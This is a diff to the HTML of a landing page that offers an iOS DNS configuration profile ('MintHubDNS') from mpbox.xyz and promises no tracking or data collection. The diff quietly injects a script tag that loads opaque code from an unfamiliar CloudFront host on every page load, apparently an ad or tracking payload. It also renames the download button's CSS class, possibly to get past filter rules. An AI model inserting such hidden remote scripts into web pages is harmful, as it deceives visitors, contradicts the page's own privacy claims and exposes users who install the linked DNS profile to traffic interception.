@@ -42,6 +42,7 @@
         href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
         crossorigin="anonymous"
         referrerpolicy="no-referrer">
+<script data-cfasync="false" src="//dl4d3y1ajyv3q.cloudfront.net/?aydld=1219466"></script>
     <style>
       * {
         margin: 0;
@@ -278,7 +279,7 @@
         margin-bottom: 30px;
       }
 
-      .download-btn {
+      .download-icon {
         display: inline-flex;
         align-items: center;
         gap: 10px;
@@ -297,7 +298,7 @@
         overflow: hidden;
       }
 
-      .download-btn::after {
+      .download-icon::after {
         content: '';
         position: absolute;
         top: 0;
@@ -308,16 +309,16 @@
         transition: left 0.7s ease;
       }
 
-      .download-btn:hover {
+      .download-icon:hover {
         transform: translateY(-5px) scale(1.03);
         box-shadow: 0 12px 25px rgba(62, 180, 137, 0.4);
       }
 
-      .download-btn:hover::after {
+      .download-icon:hover::after {
         left: 100%;
       }
 
-      .download-btn i {
+      .download-icon i {
         font-size: 1.2rem;
       }
 
@@ -924,7 +925,7 @@
                 <i class="fas fa-user-secret" style="margin-right: 5px;"></i> Zero data collection • Works locally • No tracking
               </p>
             </div>
-            <a href="https://mpbox.xyz/archive/MintHubDNS.mobileconfig" class="download-btn">
+            <a href="https://mpbox.xyz/archive/MintHubDNS.mobileconfig" class="download-icon">
               <i class="fas fa-download"></i> Install DNS Profile </a>
             <p style="font-size: 0.85rem; color: var(--gray-medium); margin-top: 20px;"> File size: 1.8 KB • Version 2.3.0 • Updated November 2023 </p>
           </div>
